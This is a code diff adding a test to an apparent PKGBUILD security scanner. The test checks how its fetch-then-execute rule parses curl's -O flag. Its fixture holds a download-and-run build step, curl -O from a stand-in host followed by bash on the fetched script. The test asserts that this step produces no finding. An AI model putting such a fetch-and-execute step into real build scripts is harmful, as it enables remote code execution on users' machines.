@@ -99,3 +99,18 @@ def test_rce004_does_not_fire_when_patch_is_applied_normally(make_pkgbuild_ctx):
         """
     )
     assert list(RCE004DisguisedSourceExecuted().check(ctx)) == []
+
+
+def test_rce003_does_not_treat_curl_remote_name_url_as_a_target(make_pkgbuild_ctx):
+    # curl's -O (uppercase, no value) derives the local filename from the URL
+    # itself -- it must not consume the following URL as if it were an explicit
+    # output path the way -o does.
+    ctx = make_pkgbuild_ctx(
+        """
+        build() {
+          curl -O https://example.com/payload.sh
+          bash payload.sh
+        }
+        """
+    )
+    assert list(RCE003FetchThenExecute().check(ctx)) == []
